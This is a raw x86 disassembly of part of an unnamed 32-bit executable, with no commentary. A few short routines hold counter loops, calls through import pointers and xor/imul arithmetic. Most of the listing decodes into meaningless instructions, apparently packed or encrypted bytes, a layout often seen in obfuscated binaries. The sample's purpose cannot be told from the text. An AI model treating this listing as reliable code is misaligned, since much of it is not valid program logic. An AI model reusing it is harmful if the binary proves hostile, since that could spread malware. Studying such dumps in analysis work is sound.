  403a2b:	call   DWORD PTR ds:0x4120c0
  403a31:	cmp    DWORD PTR ds:0x43367b,0x1e
  403a38:	jb     0x403a0a
  403a3e:	add    edi,ecx
  403a40:	add    edx,ecx
  403a42:	mov    DWORD PTR ds:0x433757,0x19
  403a4c:	cmp    DWORD PTR ds:0x433757,0x0
  403a53:	je     0x403a80
  403a59:	cmp    DWORD PTR ds:0x433757,0x26
  403a60:	jne    0x403a6e
  403a66:	push   0x0
  403a68:	call   DWORD PTR ds:0x4120c4
  403a6e:	mov    ebx,DWORD PTR ds:0x433757
  403a74:	dec    ebx
  403a75:	mov    DWORD PTR ds:0x433757,ebx
  403a7b:	jmp    0x403a4c
  403a80:	imul   edx,edi
  403a83:	mov    edi,DWORD PTR [ebp-0x8]
  403a86:	and    DWORD PTR ds:0x43379b,ebx
  403a8c:	mov    ebx,DWORD PTR [ebp-0x10]
  403a8f:	sub    ebx,edi
  403a91:	cmp    ebx,edx
  403a93:	ja     0x403aa5
  403a99:	mov    edx,DWORD PTR [ebp-0x4]
  403a9c:	xor    edx,eax
  403a9e:	add    edx,ecx
  403aa0:	jmp    0x40478a
  403aa5:	mov    edx,DWORD PTR [ebp-0x2c]
  403aa8:	mov    edi,DWORD PTR [ebp-0x4]
  403aab:	xor    edx,eax
  403aad:	xor    edi,eax
  403aaf:	add    edi,ecx
  403ab1:	add    edx,ecx
  403ab3:	imul   edx,edi
  403ab6:	mov    edi,DWORD PTR [ebp-0x8]
  403ab9:	jmp    0x403dbc
  403abe:	pop    ebp
  403abf:	cli    
  403ac0:	mov    bh,0xac
  403ac2:	jno    0x403a75
  403ac4:	gs dec ebx
  403ac6:	or     BYTE PTR [edi],dl
  403ac8:	scas   al,BYTE PTR es:[edi]
  403ac9:	loopne 0x403aa7
  403acb:	fcomip st,st(1)
  403acd:	push   edi
  403ace:	and    BYTE PTR [eax],dl
  403ad0:	jle    0x403b50
  403ad2:	pop    eax
  403ad3:	jl     0x403b53
  403ad5:	jle    0x403b17
  403ad7:	xchg   ebx,eax
  403ad8:	mov    esp,0xc1635d96
  403add:	cmp    DWORD PTR [ecx+eiz*1+0x3],ebx
  403ae1:	and    eax,0x3b33d6d0
  403ae6:	ins    DWORD PTR es:[edi],dx
  403ae7:	add    eax,0xc0cc6c7e
  403aec:	xor    eax,0xc328d7af
  403af1:	das    
  403af2:	pop    ds
  403af3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403af4:	mov    edi,0x1c1984ba
  403af9:	dec    eax
  403afa:	inc    ebp
  403afb:	bound  edx,QWORD PTR [edi-0x5809cf3c]
  403b01:	aad    0xa2
  403b03:	int3   
  403b04:	jo     0x403b19
  403b06:	lahf   
  403b07:	adc    BYTE PTR [edi],dh
  403b09:	or     al,0x7a
  403b0b:	dec    eax
  403b0c:	lods   eax,DWORD PTR ds:[esi]
  403b0d:	fwait
  403b0e:	xlat   BYTE PTR ds:[ebx]
  403b0f:	nop
  403b10:	or     bl,bl
  403b12:	push   cs
  403b13:	in     eax,0x27
  403b15:	cmp    eax,0x703cf025
  403b1a:	cmc    
  403b1b:	fs in  al,dx
  403b1d:	stos   BYTE PTR es:[edi],al
  403b1e:	aam    0x8d
  403b20:	mov    ds:0xda45282d,al
  403b25:	cmc    
  403b26:	add    DWORD PTR [ebx+0xe389c33],edi
  403b2c:	cmp    BYTE PTR [esi-0x1cea0a98],dl
  403b32:	push   0x2e
  403b34:	cli    
  403b35:	sbb    al,0x44
  403b37:	test   al,0x47
  403b39:	mov    ds:0xb703a3b5,al
  403b3e:	test   ecx,eax
  403b40:	sbb    eax,0x2e27c2c2
  403b45:	test   DWORD PTR [ecx+edi*4],0x62a022cd
  403b4c:	sbb    eax,0x833e29de
  403b51:	lods   eax,DWORD PTR ds:[esi]
  403b52:	push   ss
  403b53:	into   
  403b54:	fild   DWORD PTR [edx]
  403b56:	mov    ds:0xdb2d3254,eax
  403b5b:	xor    DWORD PTR [edx-0x17],ebp
  403b5e:	enter  0x8a6a,0x71
  403b62:	pop    esi
  403b63:	or     BYTE PTR [ebp+0x484138d3],0x89
  403b6a:	aaa    
  403b6b:	bnd ret 
  403b6d:	push   ss
  403b6e:	pop    esi
  403b6f:	mul    DWORD PTR [ebx+0x34ec3cea]
  403b75:	add    eax,0x77bb2c16
  403b7a:	enter  0x3ecc,0x40
  403b7e:	sahf   
  403b7f:	sub    cl,BYTE PTR ds:0x55ea676c
  403b85:	shl    DWORD PTR [esp+esi*1],1
  403b88:	push   eax
  403b89:	mov    WORD PTR [ebp+ecx*4+0x6736c10a],es
  403b90:	sbb    eax,0x56fe737f
  403b95:	hlt    
  403b96:	or     BYTE PTR ds:0x833e98b0,dh
  403b9c:	(bad)  
  403b9d:	ror    BYTE PTR [eax-0x592312ec],cl
  403ba3:	imul   esi,DWORD PTR [esi],0xffffffdf
  403ba6:	out    0xe1,eax
  403ba8:	jp     0x403c26
  403baa:	push   edi
  403bab:	pop    eax
  403bac:	mov    ebp,0x3188c268
  403bb1:	push   eax
  403bb2:	and    edx,DWORD PTR [esi+0x57]
  403bb5:	jno    0x403b9e
  403bb7:	push   ds
  403bb8:	dec    ecx
  403bb9:	pop    esi
  403bba:	dec    ebx
  403bbb:	xchg   ecx,eax
  403bbc:	adc    ebx,ebp
  403bbe:	popf   
  403bbf:	stc    
  403bc0:	nop
  403bc1:	packsswb mm0,mm2
  403bc4:	shr    BYTE PTR [ebx],0x39
  403bc7:	jo     0x403be0
  403bc9:	nop
  403bca:	add    eax,0xc6d3dd5f
  403bcf:	shl    DWORD PTR [edx+0x37939f31],cl
  403bd5:	jne    0x403ba1
  403bd7:	xchg   ebp,eax
  403bd8:	jle    0x403b95
  403bda:	not    BYTE PTR [ebx-0x230f2eb5]
  403be0:	pop    ss
  403be1:	leave  
  403be2:	or     DWORD PTR [eax],edi
  403be4:	ret    0x35df
  403be7:	das    
  403be8:	mov    edi,DWORD PTR [eax]
  403bea:	bound  ebp,QWORD PTR [edx-0x45feb29f]
  403bf0:	aas    
  403bf1:	mov    bl,0xed
  403bf3:	mov    al,ds:0x5d8cc17
  403bf8:	mov    ebp,0x2976a930
  403bfd:	add    al,0x4c
  403bff:	cld    
  403c00:	pop    ebx
  403c01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c02:	test   eax,0xb98f6f9f
  403c07:	mov    dl,0x93
  403c09:	inc    ebx
  403c0a:	xchg   ebx,eax
  403c0b:	leave  
  403c0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c0d:	fisubr DWORD PTR [ebx+0x78]
  403c10:	add    dl,al
  403c12:	cmp    ebx,ebx
  403c14:	jmp    0x403c01
  403c16:	and    DWORD PTR [ebx+0x13],0xffffffa1
  403c1a:	fld    DWORD PTR [eax+0xbc5617e]
  403c20:	aad    0x6a
  403c22:	out    0xe0,eax
  403c24:	adc    BYTE PTR [edi],bh
  403c26:	and    esp,esp
  403c28:	in     al,dx
  403c29:	pop    es
  403c2a:	imul   ebp,DWORD PTR [ecx],0x3
  403c2d:	jmp    0x1f87:0xecfea081
  403c34:	sbb    DWORD PTR [esi+0x54],ebp
  403c37:	jb     0x403c04
  403c39:	push   ecx
  403c3a:	jge    0x403c58
  403c3c:	fdivr  DWORD PTR [edi+0x3fcc0e04]
  403c42:	inc    esp
  403c43:	lahf   
  403c44:	push   ebp
  403c45:	adc    ebx,edi
  403c47:	hlt    
  403c48:	enter  0x426,0xf9
  403c4c:	inc    eax
  403c4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c4e:	mov    dh,0x81
  403c50:	shl    DWORD PTR [edi],cl
  403c52:	mov    esi,DWORD PTR [eax]
  403c54:	mov    eax,ds:0x42f48375
  403c59:	int3   
  403c5a:	ja     0x403c0b
  403c5c:	cmp    DWORD PTR [edi-0x2],ebx
  403c5f:	jae    0x403beb
  403c61:	mov    ebx,0x4d071373
  403c66:	xor    al,0xb3
  403c68:	dec    edi
  403c69:	in     eax,0x9e
  403c6b:	jmp    0xf45a8e4e
  403c70:	jns    0x403c65
  403c72:	aaa    
  403c73:	adc    DWORD PTR [eax+0x4d],ecx
  403c76:	xor    edx,DWORD PTR [eax-0x38]
  403c79:	jno    0x403c90
  403c7b:	sbb    BYTE PTR [ecx-0x18],ah
  403c7e:	mov    ecx,0xb2a5f9e9
  403c83:	mov    al,bl
  403c85:	das    
  403c86:	dec    esp
  403c87:	jbe    0x403c39
  403c89:	add    BYTE PTR ds:[ebx+0x672ac293],ah
  403c90:	dec    esi
  403c91:	dec    edi
  403c92:	cmp    BYTE PTR [ebx-0x66],ah
  403c95:	cld    
  403c96:	sub    eax,0xb63b9a35
  403c9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c9c:	jg     0x403c96
  403c9e:	loop   0x403cea
  403ca0:	xor    eax,0xf27aecd
  403ca5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ca6:	in     al,0x8c
  403ca8:	fcmovnb st,st(0)
  403caa:	scas   al,BYTE PTR es:[edi]
  403cab:	adc    eax,0x2c3c7fbc
  403cb0:	jbe    0x403c34
  403cb2:	xor    al,0xd4
  403cb4:	sub    eax,0x280a3bf4
  403cb9:	cmc    
  403cba:	sub    BYTE PTR [esi+0x3ec836a4],bl
  403cc0:	jge    0x403d02
  403cc2:	neg    dh
  403cc4:	pop    ecx
  403cc5:	mov    cl,0x4b
  403cc7:	dec    ebp
  403cc8:	iret   
  403cc9:	mov    dh,0x48
  403ccb:	pushw  0xffec
  403cce:	int3   
  403ccf:	rcl    BYTE PTR [ebx-0x4b],1
  403cd2:	stos   BYTE PTR es:[edi],al
  403cd3:	pop    edx
  403cd4:	mov    BYTE PTR fs:[ecx+0x51ad4abe],al
  403cdb:	test   al,0xfe
  403cdd:	in     eax,0xbf
  403cdf:	loope  0x403c98
  403ce1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ce2:	ins    DWORD PTR es:[edi],dx
  403ce3:	icebp  
  403ce4:	xor    BYTE PTR [ecx+0x71],ch
  403ce7:	test   al,0x60
  403ce9:	lea    eax,[edx]
  403ceb:	or     esp,ecx
  403ced:	xlat   BYTE PTR ds:[ebx]
  403cee:	push   cs
  403cef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403cf0:	and    BYTE PTR fs:[ecx],ah
  403cf3:	add    DWORD PTR [ebx+0x1eab3dec],0x5f7b9fa1
  403cfd:	ret    0x174d
  403d00:	imul   esp,DWORD PTR [edx-0x53],0x47a341cc
  403d07:	inc    edx
  403d08:	sbb    DWORD PTR [edi-0x553f38fc],esp
  403d0e:	mov    eax,esi
  403d10:	sbb    esi,DWORD PTR [edx+0x2f88907]
  403d16:	mov    bh,0xd9
  403d18:	pop    edi
  403d19:	outs   dx,DWORD PTR ds:[esi]
  403d1a:	jno    0x403cae
  403d1c:	inc    ecx
  403d1d:	sbb    al,0x1b
  403d1f:	pop    edi
  403d20:	les    esp,FWORD PTR [ebx-0x6e066f40]
  403d26:	daa    
  403d27:	and    DWORD PTR [esi-0x3f],edi
  403d2a:	fsubr  QWORD PTR [ecx+0x40]
  403d2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d2e:	add    eax,0xa4bb8a2f
  403d33:	(bad)  
  403d34:	sub    BYTE PTR [ecx-0x7855d345],0xa
  403d3b:	mov    ds:0x7e4c5388,eax
  403d40:	ret    0x8fbf
  403d43:	jnp    0x403d40
  403d45:	mov    eax,ds:0x9c5a666b
  403d4a:	mov    BYTE PTR [edx-0xd00cc07],dl
  403d50:	inc    eax
  403d51:	cdq    
  403d52:	inc    ebp
  403d53:	xlat   BYTE PTR ds:[ebx]
  403d54:	push   0xffffff83
  403d56:	neg    DWORD PTR [edi]
  403d58:	repz loope 0x403d67
  403d5b:	xlat   BYTE PTR ds:[ebx]
  403d5c:	cli    
  403d5d:	jnp    0x403cdf
  403d5f:	dec    ebp
  403d60:	aas    
  403d61:	inc    ebp
  403d62:	add    esp,ebx
  403d64:	rcr    BYTE PTR [esi+0x36],0x1a
  403d68:	push   esi
  403d69:	test   DWORD PTR [esi],esi
  403d6b:	dec    esp
  403d6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d6d:	into   
  403d6e:	test   eax,0x1b69fb6e
  403d73:	jbe    0x403d7a
  403d75:	mov    BYTE PTR [edi+0x5dcef39],al
  403d7b:	push   esp
  403d7c:	xchg   DWORD PTR [ecx+0x5ee54d7e],ebx
  403d82:	mov    al,ds:0x7cd5b191
  403d87:	xchg   esp,eax
  403d88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d89:	fidivr DWORD PTR [ebp-0x7d]
  403d8c:	push   0x40e2fda6
  403d91:	mov    bh,0x37
  403d93:	cmp    eax,0xb8f8ba7e
  403d98:	dec    ebx
  403d99:	push   ecx
  403d9a:	and    DWORD PTR [ebp-0x7f],edi
  403d9d:	pop    edx
  403d9e:	inc    esi
  403d9f:	inc    BYTE PTR [eax-0xd4afc1b]
  403da5:	stc    
  403da6:	pusha  
  403da7:	inc    edi
  403da8:	xchg   ecx,eax
  403da9:	or     edx,DWORD PTR [ecx]
  403dab:	call   0xb03f1e88
  403db0:	cli    
  403db1:	int    0x14
  403db3:	aaa    
  403db4:	jnp    0x403e05
  403db6:	repnz dec eax
  403db8:	mov    edx,0x8b55a6c7
  403dbd:	pop    ebp
  403dbe:	lock sub ebx,edi
  403dc1:	cmp    ebx,edx
  403dc3:	ja     0x403dd1
  403dc9:	mov    edx,DWORD PTR [ebp-0x28]
  403dcc:	jmp    0x404176
  403dd1:	mov    edx,DWORD PTR [ebp-0x30]
  403dd4:	mov    edi,DWORD PTR [ebp-0x4]
  403dd7:	xor    edx,eax
  403dd9:	xor    edi,eax
  403ddb:	add    edi,ecx
  403ddd:	add    edx,ecx
  403ddf:	imul   edx,edi
  403de2:	mov    edi,DWORD PTR [ebp-0x8]
  403de5:	mov    ebx,DWORD PTR [ebp-0x10]
  403de8:	sub    ebx,edi
  403dea:	cmp    ebx,edx
  403dec:	ja     0x403dfa
  403df2:	mov    edx,DWORD PTR [ebp-0x2c]
  403df5:	jmp    0x404176
  403dfa:	mov    edx,DWORD PTR [ebp-0x34]
  403dfd:	mov    edi,DWORD PTR [ebp-0x4]
  403e00:	xor    edx,eax
  403e02:	xor    edi,eax
  403e04:	add    edi,ecx
  403e06:	add    edx,ecx
  403e08:	imul   edx,edi
  403e0b:	mov    edi,DWORD PTR [ebp-0x8]
  403e0e:	mov    ebx,DWORD PTR [ebp-0x10]
  403e11:	sub    ebx,edi
  403e13:	cmp    ebx,edx
  403e15:	ja     0x403e23
  403e1b:	mov    edx,DWORD PTR [ebp-0x30]
  403e1e:	jmp    0x404176
  403e23:	mov    edx,DWORD PTR [ebp-0x38]
  403e26:	mov    edi,DWORD PTR [ebp-0x4]
  403e29:	xor    edx,eax
  403e2b:	xor    edi,eax
  403e2d:	add    edi,ecx
  403e2f:	add    edx,ecx
  403e31:	imul   edx,edi
  403e34:	mov    edi,DWORD PTR [ebp-0x8]
  403e37:	mov    ebx,DWORD PTR [ebp-0x10]
  403e3a:	sub    ebx,edi
  403e3c:	cmp    ebx,edx
  403e3e:	ja     0x403e4c
  403e44:	mov    edx,DWORD PTR [ebp-0x34]
  403e47:	jmp    0x404176
  403e4c:	mov    edx,DWORD PTR [ebp-0x3c]
  403e4f:	mov    edi,DWORD PTR [ebp-0x4]
  403e52:	xor    edx,eax
  403e54:	xor    edi,eax
  403e56:	add    edx,ecx
  403e58:	add    edi,ecx
  403e5a:	imul   edx,edi
  403e5d:	mov    edi,DWORD PTR [ebp-0x8]
  403e60:	mov    ebx,DWORD PTR [ebp-0x10]
  403e63:	jmp    0x404166
  403e68:	mov    dh,0x45
  403e6a:	xchg   edi,eax
  403e6b:	xor    BYTE PTR [ebp+0x50],0xb1
  403e6f:	jno    0x403e18
  403e71:	(bad)  
  403e72:	cs push 0x49
  403e75:	ret    0x8c70
  403e78:	or     bl,BYTE PTR [edi]
  403e7a:	jle    0x403efa
  403e7c:	pop    eax
  403e7d:	jl     0x403efd
  403e7f:	jle    0x403e26
  403e81:	mov    ecx,0x657fa485
  403e86:	jb     0x403e83
  403e88:	sbb    DWORD PTR [edi-0x31ced153],edx
  403e8e:	mov    BYTE PTR [eax+0x3],0xe
  403e92:	and    al,0xef
  403e94:	das    
  403e95:	mov    dl,BYTE PTR [eax+0x19]
  403e98:	add    eax,0x3aa7ff43
  403e9d:	out    dx,al
  403e9e:	or     al,0x68
  403ea0:	les    edx,FWORD PTR [eax]
  403ea2:	jae    0x403e7d
  403ea4:	cdq    
  403ea5:	sbb    BYTE PTR [ebp-0x73],cl
  403ea8:	in     eax,0x2b
  403eaa:	(bad)  
  403eab:	dec    esp
  403eac:	mov    ds:0x30982ac8,al
  403eb1:	fisub  DWORD PTR [esi+0xb]
  403eb4:	dec    ebp
  403eb5:	sub    eax,0x54233931
  403eba:	arpl   WORD PTR [ebp+eiz*8+0x5b2d6b3c],sp
  403ec1:	push   0xf9b910ba
  403ec6:	sbb    BYTE PTR [esi-0x476213d0],dl
  403ecc:	xchg   DWORD PTR [ecx+0x26214ca0],ebp
  403ed2:	dec    edx
  403ed3:	icebp  
  403ed4:	xchg   edx,eax
  403ed5:	sbb    BYTE PTR [eax+0x327d2d05],cl
  403edb:	fs mov bl,0xaf
  403ede:	sar    eax,1
  403ee0:	ret    
  403ee1:	daa    
  403ee2:	mov    ebp,0xc85f81ef
  403ee7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ee8:	sub    ebx,edx
  403eea:	ds add al,0x6e
  403eed:	test   al,0xab
  403eef:	fimul  DWORD PTR [edi+0x348abfa0]
  403ef5:	and    BYTE PTR [edi],bl
  403ef7:	cmc    
  403ef8:	arpl   WORD PTR [ebp+0x3a6aa690],dx
  403efe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403eff:	enter  0x95d7,0xa9
  403f03:	sub    eax,0x8c6f9d2b
  403f08:	into   
  403f09:	jne    0x403f17
  403f0b:	in     eax,dx
  403f0c:	pushf  
  403f0d:	add    DWORD PTR [esi+0xdd78f5e],edi
  403f13:	xchg   esi,eax
  403f14:	test   DWORD PTR [edi+0x6db5b151],ebx
  403f1a:	xchg   esi,eax
  403f1b:	(bad)  
  403f1c:	fwait
  403f1d:	pop    esp
  403f1e:	xchg   ebx,eax
  403f1f:	cmp    bl,bl
  403f21:	xor    esi,DWORD PTR [ecx-0x7a]
  403f24:	(bad)  
  403f25:	out    dx,al
  403f26:	add    edx,DWORD PTR [esi-0x642b66d3]
  403f2c:	or     DWORD PTR [eax+0x29ba2514],ebp
  403f32:	cs push esi
  403f34:	sar    DWORD PTR [edx],1
  403f36:	add    BYTE PTR ds:0x61b4c824,ah
  403f3c:	clc    
  403f3d:	xchg   edi,eax
  403f3e:	cwde   
  403f3f:	push   esp
  403f40:	jno    0x403fad
  403f42:	inc    esi
  403f43:	mov    WORD PTR [edi+0x1f9ef397],cs
  403f49:	mov    BYTE PTR [ebx],ah
  403f4b:	mov    dl,0x17
  403f4d:	dec    ebx
  403f4e:	in     eax,dx
  403f4f:	fidiv  WORD PTR [edi]
  403f51:	or     BYTE PTR [esi-0x7a93bff6],bl
  403f57:	add    DWORD PTR [edi-0x49],0x2f
  403f5b:	mov    ds:0x4ed297dd,al
  403f60:	std    
  403f61:	fstp   QWORD PTR [esi]
  403f63:	aam    0x4c
  403f65:	push   esi
  403f66:	out    dx,eax
  403f67:	jne    0x403f22
  403f69:	inc    edx
  403f6a:	mov    bh,0xc0
  403f6c:	out    dx,al
  403f6d:	data16 cmp al,0xa0
  403f70:	(bad)  
  403f71:	push   edx
  403f72:	sti    
  403f73:	xor    ebx,DWORD PTR [edx]
  403f75:	cld    
  403f76:	mov    WORD PTR [ebp+0x17dc3d9f],cs
  403f7c:	ds adc eax,0x2e9176eb
  403f82:	push   0xffffffb6
  403f84:	pop    ebp
  403f85:	ja     0x403f34
  403f87:	test   DWORD PTR gs:[esp+edx*4],ecx
  403f8b:	sti    
  403f8c:	sbb    edx,0x32
  403f8f:	push   0x4a30112b
  403f94:	ins    DWORD PTR es:[edi],dx
  403f95:	jnp    0x403f56
  403f97:	cmp    BYTE PTR [ebx],0x51
  403f9a:	jecxz  0x403fda
  403f9c:	in     al,0x6c
  403f9e:	or     DWORD PTR ss:[edi+eax*2],ecx
  403fa2:	loopne 0x403fd4
  403fa4:	inc    ebx
  403fa5:	mov    ds:0x393bfa88,eax
  403faa:	cs sub eax,0xda951ba5
  403fb0:	or     ebx,DWORD PTR cs:[ebx]
  403fb3:	mov    eax,0xe871d6e7
  403fb8:	cdq    
  403fb9:	xchg   ebp,eax
  403fba:	fstp   DWORD PTR [ebp-0x2553d09d]
  403fc0:	mov    eax,ds:0x399cdff1
  403fc5:	cmp    al,0xa
  403fc7:	test   BYTE PTR [esi+esi*8+0x341b7da4],0xef
  403fcf:	js     0x403f51
  403fd1:	adc    ah,bl
  403fd3:	jecxz  0x403fe9
  403fd5:	iret   
  403fd6:	or     al,0xbd
  403fd8:	cmp    edi,DWORD PTR [esi-0x71]
  403fdb:	cmp    BYTE PTR [edi],cl
  403fdd:	dec    edi
  403fde:	test   eax,0xecee7938
  403fe3:	jecxz  0x403ff4
  403fe5:	inc    esp
  403fe6:	push   cs
  403fe7:	(bad)  
  403fe8:	cmp    DWORD PTR [esi],edi
  403fea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403feb:	outs   dx,BYTE PTR ds:[esi]
  403fec:	loop   0x403f83
  403fee:	test   BYTE PTR [eax],dh
  403ff0:	in     eax,0xbb
  403ff2:	xchg   edx,eax
  403ff3:	je     0x403fea
  403ff5:	pushf  
  403ff6:	cdq    
  403ff7:	sbb    BYTE PTR [eax+0x3c9c6073],ah
  403ffd:	movs   BYTE PTR es:[di],BYTE PTR es:[si]
  404000:	pop    ebx
  404001:	popa   
  404002:	cmp    BYTE PTR [ebp+0x381a6fea],ah
  404008:	imul   esp,DWORD PTR [eax],0x7bf7f611
  40400e:	cmc    
  40400f:	push   cs
  404010:	inc    ebp
  404011:	repnz jmp 0x232a:0x9ef53d44
  404019:	push   0x1b
  40401b:	dec    esp
  40401c:	mov    ebx,0x7a9c837b
  404021:	mov    DWORD PTR [edi-0x50af9ddb],edx
  404027:	mov    dh,0x1
  404029:	pusha  
  40402a:	dec    edx
  40402b:	inc    edi
  40402c:	int3   
  40402d:	stos   BYTE PTR es:[edi],al
  40402e:	ss sahf 
  404030:	jo     0x403ff4
  404032:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404034:	std    
  404035:	pop    ebx
  404036:	mov    ?,eax
  404038:	inc    ebx
  404039:	pop    esi
  40403a:	test   eax,0xe93a12c4
  40403f:	js     0x404046
  404041:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404042:	mov    ?,esi
  404044:	push   esp
  404045:	jb     0x404001
  404047:	sar    BYTE PTR [edi-0x4940674d],cl
  40404d:	xchg   esp,eax
  40404e:	pop    ecx
  40404f:	push   eax
  404050:	shr    BYTE PTR [ebx],cl
  404052:	mov    edx,0xbde31242
  404057:	arpl   WORD PTR [ecx],bx
  404059:	mov    ecx,0x5abe2444
  40405e:	and    dh,bh
  404060:	xor    eax,0x340f8fb0
  404065:	inc    ebp
  404066:	je     0x40401e
  404068:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404069:	inc    esi
  40406a:	and    DWORD PTR [eax],edi
  40406c:	cmp    cl,dh
  40406e:	mov    dl,0x7f
  404070:	dec    esi
  404071:	aaa    
  404072:	je     0x40401e
  404074:	pshufw mm3,mm1,0xb7
  404078:	or     BYTE PTR [ecx+0x37],bh
  40407b:	mov    dh,0xdc
  40407d:	add    eax,edi
  40407f:	add    al,0xcd
  404081:	jecxz  0x4040f0
  404083:	mov    DWORD PTR [ebp-0x2d],ecx
  404086:	push   es
  404087:	mov    ds,WORD PTR [ecx-0x33]
  40408a:	aam    0xce
  40408c:	rcr    BYTE PTR [eax],0x73
  40408f:	addr16 sub al,0x91
  404092:	aad    0xd7
  404094:	dec    ebx
  404095:	dec    ecx
  404096:	in     eax,dx
  404097:	mov    dh,0xb9
  404099:	out    dx,al
  40409a:	jnp    0x404049
  40409c:	jae    0x404105
  40409e:	cdq    
  40409f:	aas    
  4040a0:	fistp  DWORD PTR [esi]
  4040a2:	stos   BYTE PTR es:[edi],al
  4040a3:	in     eax,dx
  4040a4:	aam    0x4f
  4040a6:	fimul  WORD PTR [esi+eiz*8-0x61]
  4040aa:	xchg   ebx,eax
  4040ab:	xor    esp,ebp
  4040ad:	push   ebx
  4040ae:	icebp  
  4040af:	neg    BYTE PTR [edi-0x2d]
  4040b2:	sahf   
  4040b3:	int3   
  4040b4:	sub    DWORD PTR ds:0xad840fac,ebx
  4040ba:	pushf  
  4040bb:	iret   
  4040bc:	in     eax,dx
  4040bd:	dec    ebp
  4040be:	leave  
  4040bf:	and    DWORD PTR [eax+0x28],edi
  4040c2:	push   ss
  4040c3:	push   esp
  4040c4:	sub    ebp,ecx
  4040c6:	imul   edx,DWORD PTR [edi],0xffffff8a
  4040c9:	cmovno ecx,DWORD PTR [eax+0x33e9910e]
  4040d0:	pop    edi
  4040d1:	or     esp,DWORD PTR [ecx+0x2afebad]
  4040d7:	fisubr WORD PTR [edx]
  4040d9:	jmp    0xbc1d:0x7c1ac363
  4040e0:	jle    0x40415d
  4040e2:	jb     0x4040e9
  4040e4:	mov    esi,0x4ebc63ee
  4040e9:	mov    ecx,0xb9afafe9
  4040ee:	sub    ebp,DWORD PTR [esi-0x1354d3a9]
  4040f4:	sbb    bl,BYTE PTR [edx]
  4040f6:	mov    ds:0x7d68e821,eax
  4040fb:	pop    ss
  4040fc:	jno    0x40413f
  4040fe:	sub    al,0x9
  404100:	nop
  404101:	rcl    BYTE PTR [eax+0xd],cl
  404104:	cmp    esp,DWORD PTR [eax-0x11]
  404107:	or     al,0x36
  404109:	ins    BYTE PTR es:[edi],dx
  40410a:	mov    eax,0x88946b52
  40410f:	mul    BYTE PTR [eax+0xc087a13]
  404115:	mov    ecx,0xa695d8a7
  40411a:	push   eax
  40411b:	mov    ah,0xc1
  40411d:	mov    eax,ds:0xb1ec1cd8
  404122:	sbb    BYTE PTR [ecx],cl
  404124:	dec    ecx
  404125:	xchg   DWORD PTR [edx],ebp
  404127:	imul   esi,DWORD PTR [edi],0xffffffc2
  40412a:	adc    al,0x5c
  40412c:	ror    DWORD PTR [ecx-0x1e755c73],cl
  404132:	cmp    al,0xf5
  404134:	dec    eax
  404135:	xchg   ecx,eax
  404136:	and    dh,0xe8
  404139:	cmp    al,al
  40413b:	fsub   QWORD PTR [ebx-0x3a075567]
  404141:	mov    ah,0x28
  404143:	mov    WORD PTR [edx+0x47],ss
  404146:	add    ebp,DWORD PTR [edi+0x30]
  404149:	pop    edi
  40414a:	push   eax
  40414b:	cmp    BYTE PTR [eiz*1+0x23ca8a2c],dh
  404152:	rol    BYTE PTR [ebx+esi*2],1
  404155:	mov    ecx,0x3fb3289a
  40415a:	loope  0x40417a
  40415c:	jbe    0x4041d6
  40415e:	cmp    esp,DWORD PTR [edi-0x46]
  404161:	cli    
  404162:	mov    bh,0x8f
  404164:	lds    edi,FWORD PTR [ecx-0x25c420d5]
  40416a:	mov    edx,DWORD PTR [ebp-0x38]
  40416d:	jbe    0x404176
  404173:	mov    edx,DWORD PTR [ebp-0x3c]
  404176:	mov    edi,DWORD PTR [ebp-0x4]
  404179:	jmp    0x40447c
  40417e:	mov    al,0x3b
  404180:	aaa    
  404181:	or     BYTE PTR [ebp-0x10],dh
  404184:	mov    cl,0x63
  404186:	sub    DWORD PTR [edi],0xffffffd4
  404189:	xor    BYTE PTR [esi+0x4d],al
  40418c:	jmp    0x7e5db5c8
  404191:	jle    0x4041eb
  404193:	jl     0x404213
  404195:	jle    0x40419a
  404197:	sbb    BYTE PTR [edx-0x74],ch
  40419a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40419b:	retf   
  40419c:	aaa    
  40419d:	inc    ebx
  40419e:	clc    
  40419f:	stc    
  4041a0:	ret    0xca1
  4041a3:	aaa    
  4041a4:	(bad)  
  4041a5:	xor    bl,bl
  4041a7:	div    al
  4041a9:	imul   ebp,ebp,0xc7470c18
  4041af:	or     ah,ch
  4041b1:	ds call 0x353a:0x3ee54d1c
  4041b9:	fs cmp al,0xde
  4041bc:	xor    bl,BYTE PTR [edi-0x3f]
  4041bf:	xor    ebx,DWORD PTR [edx]
  4041c1:	jmp    0xe9200c41
  4041c6:	mov    gs,ecx
  4041c8:	xor    dl,BYTE PTR [eax+0x2debc702]
  4041ce:	call   0x824d:0x9ec96f6b
  4041d5:	add    eax,0x2f821288
  4041da:	pop    ds
  4041db:	(bad)
  4041de:	ja     0x404178
  4041e0:	lock dec edi
  4041e2:	sahf   
  4041e3:	cs fsubr st,st(3)
  4041e6:	mul    DWORD PTR [edi]
  4041e8:	sti    
  4041e9:	enter  0x9d1e,0xad
  4041ed:	popa   
  4041ee:	sbb    DWORD PTR [edx],eax
  4041f0:	lods   al,BYTE PTR ds:[esi]
  4041f1:	call   0xb9d08730
  4041f6:	pop    eax
  4041f7:	pop    es
  4041f8:	into   
  4041f9:	xchg   DWORD PTR [ebp-0x35b22870],edi
  4041ff:	or     bl,bh
  404201:	stos   DWORD PTR es:[edi],eax
  404202:	outs   dx,DWORD PTR ds:[esi]
  404203:	xor    eax,0x75d30eac
  404208:	sbb    al,0xc4
  40420a:	inc    esi
  40420b:	test   DWORD PTR [ebx+0x54],esi
